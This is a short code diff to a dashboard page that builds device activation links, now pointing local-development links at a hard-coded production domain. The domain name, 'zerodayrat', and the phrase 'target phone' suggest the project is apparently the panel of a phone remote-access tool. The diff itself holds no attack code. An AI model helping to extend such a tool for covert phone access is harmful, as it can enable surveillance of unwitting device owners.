@@ -5,6 +5,14 @@ import { devicesApi } from "../api/devices";
 import type { Device } from "../api/types";
 
 /**
+ * The publicly-deployed dashboard domain — must match the host configured in
+ * the Android app's https intent-filter (AndroidManifest.xml). Links
+ * generated while running the dashboard locally (localhost dev server)
+ * still need to point here, since a target phone can never reach localhost.
+ */
+const PRODUCTION_APP_URL = "https://zerodayrat.vercel.app";
+
+/**
  * Public https URL (works in any browser, scannable by any QR reader) that
  * opens the app directly via Android App Link if installed, or falls back to
  * the /connect page's instructions otherwise. See ConnectPage.tsx and the
@@ -15,7 +23,9 @@ function buildActivationLink(device: Device): string {
     token: device.device_token || "",
     name: device.device_label,
   });
-  return `${window.location.origin}/connect?${params.toString()}`;
+  const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
+  const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
+  return `${origin}/connect?${params.toString()}`;
 }
 
 export default function DevicesListPage() {
